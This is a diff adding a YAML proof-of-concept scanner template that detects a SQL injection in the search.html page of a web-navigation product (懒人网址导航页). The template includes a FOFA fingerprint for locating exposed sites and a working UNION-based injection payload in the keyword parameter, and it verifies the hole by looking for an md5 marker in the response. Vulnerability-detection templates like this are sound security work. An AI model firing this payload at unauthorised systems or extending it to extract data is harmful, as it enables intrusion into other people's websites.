@@ -1,0 +1,16 @@
+id: poc-yaml-lanrenao-search-sqli
+info:
+  name: 懒人网址导航页search.html存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 懒人网址导航页
+  fofa: body="./templates/antidote/css/style.css"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /search.html?keyword='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x2d2d2d2d2d,md5({{.t1}}),0x2d2d2d2d2d),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-
+  expression: "status_code == 200 && \ncontains(body,t2)\n"
+transport: http
